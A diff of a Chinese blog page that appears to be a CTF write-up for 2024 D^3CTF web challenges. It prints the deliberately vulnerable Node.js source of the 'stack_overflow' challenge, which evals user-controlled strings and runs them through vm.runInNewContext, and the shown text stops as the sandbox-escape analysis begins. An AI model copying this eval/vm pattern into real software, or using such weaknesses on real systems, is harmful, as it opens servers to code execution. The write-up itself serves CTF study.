@@ -3,7 +3,7 @@
 <html lang="zh-CN">
     <head>
         <meta charset="UTF-8" />
-        <title>D^3CTF | 雲流のLowest World</title>
+        <title>2024 凌武杯 x D^3CTF | 雲流のLowest World</title>
         <meta name="author" content="C1oudfL0w0" />
         <meta name="description" content="" />
         <meta name="keywords" content="" />
@@ -76,7 +76,7 @@
     <div id="toc" class="toc-article">
     <h3><i class="fas fa-stream"></i>  目录</h3>
       <div class="toc-title"></div>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#d3pythonhttp%EF%BC%88Unsolved%EF%BC%89"><span class="toc-number">2.1.</span> <span class="toc-text">d3pythonhttp（Unsolved）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#moonbox-Unsolved"><span class="toc-number">2.2.</span> <span class="toc-text">moonbox (Unsolved)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stack-overflow-Unsolved"><span class="toc-number">2.3.</span> <span class="toc-text">stack_overflow (Unsolved)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Doctor-Unsolved"><span class="toc-number">2.4.</span> <span class="toc-text">Doctor (Unsolved)</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#d3pythonhttp%EF%BC%88Unsolved%EF%BC%89"><span class="toc-number">2.1.</span> <span class="toc-text">d3pythonhttp（Unsolved）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#moonbox-Unsolved"><span class="toc-number">2.2.</span> <span class="toc-text">moonbox (Unsolved)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stack-overflow-%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.3.</span> <span class="toc-text">stack_overflow (复现)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E5%81%9A%E6%B3%95"><span class="toc-number">2.3.1.</span> <span class="toc-text">常规做法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn%E7%9A%84%E5%81%9A%E6%B3%95%EF%BC%88False%EF%BC%89"><span class="toc-number">2.3.2.</span> <span class="toc-text">pwn的做法（False）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Doctor-Unsolved"><span class="toc-number">2.4.</span> <span class="toc-text">Doctor (Unsolved)</span></a></li></ol></li></ol>
     </div>
   
         
@@ -221,7 +221,7 @@
 
                 <div class="article">
     <div>
-        <h1>D^3CTF</h1>
+        <h1>2024 凌武杯 x D^3CTF</h1>
     </div>
     <div class="info">
         <span class="date">
@@ -250,7 +250,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">519字</span>
+        <span class="post-count">1.6k字</span>
       </span>
     </span>
 
@@ -259,7 +259,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">2分</span>
+        <span class="post-count">9分</span>
       </span>
     </span>
     
@@ -277,8 +277,10 @@
         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>好难。。做不动了qaq</p>
 <p><del>诶，我打d3，真的假的</del></p>
 <p>参考wp：</p>
-<p>NK：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/gnXiAfUlx80kZaaiRQfIow">https://mp.weixin.qq.com/s/gnXiAfUlx80kZaaiRQfIow</a></p>
+<p>NK：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/eDEnZ7WFaZVddaOlDwZSYg">https://mp.weixin.qq.com/s/eDEnZ7WFaZVddaOlDwZSYg</a></p>
 <p>W&amp;M：<a target="_blank" rel="noopener" href="https://blog.wm-team.cn/index.php/archives/75/">https://blog.wm-team.cn/index.php/archives/75/</a></p>
+<p>Boogipop（其实也是W&amp;M的web wp）：<a target="_blank" rel="noopener" href="https://boogipop.com/2024/04/30/%E5%87%8C%E6%AD%A6%E6%9D%AF%20x%20D%5E3CTF%20Web%20Writeup%202024/">https://boogipop.com/2024/04/30/%E5%87%8C%E6%AD%A6%E6%9D%AF%20x%20D%5E3CTF%20Web%20Writeup%202024/</a></p>
+<p>官方wp：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzkxNzU4OTM0MA==&mid=2247484634&idx=1&sn=f80392917739d8c0d036d27dfd0f0d4c&chksm=c1bf18e9f6c891ff4866f78746ea7c6e237b10d1e7ddee45bdcc9f654a5292da7336f0aaf8fb&mpshare=1&scene=23&srcid=0430AkULY54BqatZLQw5nc1G&sharer_shareinfo=73458752b657ac41b441edb5ef897c1c&sharer_shareinfo_first=73458752b657ac41b441edb5ef897c1c#rd">https://mp.weixin.qq.com/s?__biz=MzkxNzU4OTM0MA==&amp;mid=2247484634&amp;idx=1&amp;sn=f80392917739d8c0d036d27dfd0f0d4c&amp;chksm=c1bf18e9f6c891ff4866f78746ea7c6e237b10d1e7ddee45bdcc9f654a5292da7336f0aaf8fb&amp;mpshare=1&amp;scene=23&amp;srcid=0430AkULY54BqatZLQw5nc1G&amp;sharer_shareinfo=73458752b657ac41b441edb5ef897c1c&amp;sharer_shareinfo_first=73458752b657ac41b441edb5ef897c1c#rd</a></p>
 <span id="more"></span>
 
 <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="d3pythonhttp（Unsolved）"><a href="#d3pythonhttp（Unsolved）" class="headerlink" title="d3pythonhttp（Unsolved）"></a>d3pythonhttp（Unsolved）</h2><blockquote>
@@ -380,10 +382,319 @@
 
 <p>会用header里面的kid作为路径获取key，但是我们可以自己修改为空</p>
 <hr>
-<h2 id="moonbox-Unsolved"><a href="#moonbox-Unsolved" class="headerlink" title="moonbox (Unsolved)"></a>moonbox (Unsolved)</h2><hr>
-<h2 id="stack-overflow-Unsolved"><a href="#stack-overflow-Unsolved" class="headerlink" title="stack_overflow (Unsolved)"></a>stack_overflow (Unsolved)</h2><blockquote>
+<h2 id="moonbox-Unsolved"><a href="#moonbox-Unsolved" class="headerlink" title="moonbox (Unsolved)"></a>moonbox (Unsolved)</h2><p>月光宝盒</p>
+<hr>
+<h2 id="stack-overflow-复现"><a href="#stack-overflow-复现" class="headerlink" title="stack_overflow (复现)"></a>stack_overflow (复现)</h2><blockquote>
 <p>vm沙箱逃逸</p>
 </blockquote>
+<p><del>反正不是webpwn</del></p>
+<p>如果是本地docker起环境的时候记得转发一下3090端口</p>
+<p>审一下源码：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span>
+<span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"vm"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">let</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/static'</span><span class="token punctuation">,</span> express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span><span class="token string">'static'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">const</span> pie <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span>
+
+<span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">let</span> pattern <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(call_interface)|\&#123;\&#123;.*?\&#125;\&#125;</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>pattern<span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span>
+
+app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> <span class="token string">"/index.html"</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+
+app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">let</span> respond <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">let</span> stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    
+    <span class="token keyword">let</span> <span class="token function-variable function">getStack</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">address</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>address <span class="token operator">-</span> pie <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> address <span class="token operator">-</span> pie <span class="token operator">&lt;</span> <span class="token number">0x10000</span><span class="token punctuation">)</span> <span class="token keyword">return</span> stack<span class="token punctuation">[</span>address <span class="token operator">-</span> pie<span class="token punctuation">]</span>
+        <span class="token keyword">return</span> <span class="token number">0</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">let</span> <span class="token function-variable function">getIndex</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">address</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> address <span class="token operator">-</span> pie
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">let</span> <span class="token function-variable function">read</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> count</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">let</span> ori <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">[</span>fd<span class="token punctuation">]</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>ori<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> count<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            count <span class="token operator">=</span> ori<span class="token punctuation">.</span>length
+        <span class="token punctuation">&#125;</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> ori <span class="token operator">!==</span> <span class="token string">"string"</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>ori<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string-property property">"err"</span><span class="token operator">:</span> <span class="token string">"hack!"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+
+        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> count<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">waf</span><span class="token punctuation">(</span>ori<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string-property property">"err"</span><span class="token operator">:</span> <span class="token string">"hack!"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+            stack<span class="token punctuation">[</span><span class="token function">getIndex</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">+</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> ori<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">let</span> <span class="token function-variable function">write</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> count</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>respond<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            respond<span class="token punctuation">[</span>fd<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> count<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            respond<span class="token punctuation">[</span>fd<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">getStack</span><span class="token punctuation">(</span>buf <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span>   
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">let</span> <span class="token function-variable function">run</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">address</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">let</span> continuing <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+        <span class="token keyword">while</span> <span class="token punctuation">(</span>continuing<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token function">getStack</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">case</span> <span class="token string">"read"</span><span class="token operator">:</span>
+                    <span class="token keyword">let</span> r_fd <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+                    <span class="token keyword">let</span> read_addr <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+                    <span class="token keyword">if</span> <span class="token punctuation">(</span>read_addr<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"&#123;&#123;"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> read_addr<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">"&#125;&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                        read_addr <span class="token operator">=</span> pie <span class="token operator">+</span> <span class="token function">eval</span><span class="token punctuation">(</span>read_addr<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"stack"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>stack<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                    <span class="token punctuation">&#125;</span>
+                    <span class="token function">read</span><span class="token punctuation">(</span>r_fd<span class="token punctuation">,</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                    <span class="token keyword">break</span><span class="token punctuation">;</span>
+                <span class="token keyword">case</span> <span class="token string">"write"</span><span class="token operator">:</span>
+                    <span class="token keyword">let</span> w_fd <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+                    <span class="token keyword">let</span> write_addr <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+                    <span class="token keyword">if</span> <span class="token punctuation">(</span>write_addr<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"&#123;&#123;"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> write_addr<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">"&#125;&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                        write_addr <span class="token operator">=</span> pie <span class="token operator">+</span> <span class="token function">eval</span><span class="token punctuation">(</span>write_addr<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"stack"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>stack<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                    <span class="token punctuation">&#125;</span>
+                    <span class="token function">write</span><span class="token punctuation">(</span>w_fd<span class="token punctuation">,</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                    <span class="token keyword">break</span><span class="token punctuation">;</span>
+                <span class="token keyword">case</span> <span class="token string">"exit"</span><span class="token operator">:</span>
+                    continuing <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+                    <span class="token keyword">break</span><span class="token punctuation">;</span>
+                <span class="token keyword">case</span> <span class="token string">"call_interface"</span><span class="token operator">:</span>
+                    <span class="token keyword">let</span> numOfArgs <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+                    <span class="token keyword">let</span> cmd <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+                    <span class="token keyword">let</span> args <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+                    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> numOfArgs<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                        args<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                    <span class="token punctuation">&#125;</span>
+                    cmd <span class="token operator">+=</span> <span class="token string">"('"</span>  <span class="token operator">+</span> args<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">"','"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"')"</span>
+                    <span class="token keyword">let</span> result <span class="token operator">=</span> vm<span class="token punctuation">.</span><span class="token function">runInNewContext</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>
+                    stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                    <span class="token keyword">break</span><span class="token punctuation">;</span>
+                <span class="token keyword">case</span> <span class="token string">"push"</span><span class="token operator">:</span>
+                    <span class="token keyword">let</span> numOfElem <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+                    <span class="token keyword">let</span> elemAddr <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> numOfElem<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                        stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">getStack</span><span class="token punctuation">(</span>elemAddr <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span>
+                    <span class="token punctuation">&#125;</span>
+                    <span class="token keyword">break</span><span class="token punctuation">;</span>
+                <span class="token keyword">default</span><span class="token operator">:</span>
+                    stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">getStack</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>
+                    <span class="token keyword">break</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+            address <span class="token operator">+=</span> <span class="token number">1</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">let</span> code <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+28
+[[ 0 ]]
+stdin
+read
+Started Convertion...
+Your input is:
+2
+[[short - 3]]
+stdout
+write
+5
+[[ 0 ]]
+stdout
+write
+...
+1
+[[short - 2]]
+stdout
+write
+[[ 0 ]]
+5
+push
+(function (...a)&#123;  return a.map(char=>char.charCodeAt(0)).join(' ');&#125;)
+5
+call_interface
+Ascii is:
+1
+[[short - 2]]
+result
+write
+1
+&#123;&#123; stack - 2 &#125;&#125;
+result
+write
+Ascii is:
+1
+[[short - 2]]
+stdout
+write
+1
+&#123;&#123; stack - 3 &#125;&#125;
+stdout
+write
+ok
+1
+[[short - 2]]
+status
+write
+exit</span><span class="token template-punctuation string">`</span></span>
+    
+    code <span class="token operator">=</span> code<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> code<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>code<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>stack<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"[["</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> stack<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">"]]"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            stack<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>pie <span class="token operator">+</span> <span class="token function">eval</span><span class="token punctuation">(</span>stack<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"short"</span><span class="token punctuation">,</span> i<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">run</span><span class="token punctuation">(</span>pie <span class="token operator">+</span> <span class="token number">0</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span>respond<span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+
+app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3090</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"listen on 3090"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="常规做法"><a href="#常规做法" class="headerlink" title="常规做法"></a>常规做法</h3><p>因为是vm沙箱，所以我们先找一下最终的利用点<code>runInNewContext</code>：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">case</span> <span class="token string">"call_interface"</span><span class="token operator">:</span>
+    <span class="token keyword">let</span> numOfArgs <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
